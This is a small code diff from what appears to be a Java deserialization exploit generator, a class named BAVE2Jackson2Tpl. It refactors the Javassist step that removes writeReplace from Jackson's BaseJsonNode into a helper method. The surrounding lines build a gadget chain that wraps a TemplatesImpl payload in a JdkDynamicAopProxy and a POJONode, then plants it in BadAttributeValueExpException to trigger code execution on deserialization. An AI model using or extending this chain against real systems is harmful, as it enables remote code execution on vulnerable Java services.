@@ -29,13 +29,7 @@ public class BAVE2Jackson2Tpl {
 
         TemplatesImpl tpl1 = TemplateImplWithoutAbstractTranslet.getPayload(null);
 
-        // jackson的BaseJsonNode序列化的时候需要删掉writeReplace这个函数，不然会序列化失败
-        ClassPool classPool = ClassPool.getDefault();
-        CtClass ctClass = classPool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
-        CtMethod ctMethod = ctClass.getDeclaredMethod("writeReplace");
-        ctClass.removeMethod(ctMethod);
-        ctClass.toClass();
-
+        rmJacksonWriteReplace();
         POJONode pojoNode = new POJONode(getJdkDynamicAopProxy(tpl1));
         BadAttributeValueExpException bave = new BadAttributeValueExpException(null);
         setFieldValue(bave, "val", pojoNode);
